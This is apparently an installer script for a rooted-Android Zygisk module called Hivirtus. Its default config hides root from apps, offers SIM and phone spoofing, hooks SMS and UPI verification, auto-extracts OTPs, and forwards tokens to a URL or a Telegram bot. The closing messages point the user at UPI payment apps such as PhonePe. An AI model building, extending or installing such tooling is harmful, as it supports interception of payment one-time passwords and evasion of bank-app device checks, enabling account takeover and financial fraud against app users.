#!/system/bin/sh
# Hivirtus Zygisk Mode — Magisk / KernelSU / APatch / SukiSU installer

ui_print "*******************************"
ui_print "   Hivirtus Zygisk Mode v2.22.0  "
ui_print "   Hivirtus Menu — MotaGian style  "
ui_print "*******************************"

if [ -z "$MODPATH" ]; then
  ui_print "! ERROR: MODPATH not set"
  abort "Installation failed"
fi

ui_print "- Installing to $MODPATH"

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
[ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
[ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
[ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
[ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
[ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644

if [ ! -f "$MODPATH/zygisk/arm64-v8a.so" ] && [ ! -f "$MODPATH/zygisk/armeabi-v7a.so" ]; then
  ui_print "! WARNING: No Zygisk native libs in module"
  ui_print "! Rebuild zip with ./build.sh"
fi

if [ ! -f "$MODPATH/config.json" ]; then
  ui_print "- Creating default config"
  cat > "$MODPATH/config.json" << 'EOF'
{
  "hide_root": false,
  "hide_developer": false,
  "hide_magisk": true,
  "hide_kernelsu": true,
  "hide_apatch": true,
  "hide_sukisu": true,
  "hide_all_root_apps": true,
  "enable_sim1_mock": false,
  "enable_sim2_mock": false,
  "enable_phone_spoof": false,
  "mock_country_iso": "in",
  "hook_incoming_sms": true,
  "hook_outgoing_sms": true,
  "hook_upi_verification": true,
  "auto_extract_otp": true,
  "auto_forward_token": true,
  "forward_url": "",
  "telegram_chat_id": "",
  "telegram_bot_token": "",
  "log_file": "/data/local/tmp/hivirtus_zygisk_mode.log"
}
EOF
  set_perm "$MODPATH/config.json" 0 0 0644
fi

if [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
  ui_print "- KernelSU detected"
elif [ -f /data/adb/magisk.db ]; then
  ui_print "- Magisk detected"
elif [ -d /data/adb/apatch ]; then
  ui_print "- APatch detected"
fi

echo "1" > /data/local/tmp/hivirtus_module_installed.flag
chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null

ui_print "- Module installed successfully"
ui_print "- Reboot → open any UPI app (KreditBee, PhonePe…)"
ui_print "- Hook + bottom status pill auto show hoga"
ui_print "- Edit $MODPATH/config.json for Telegram token"
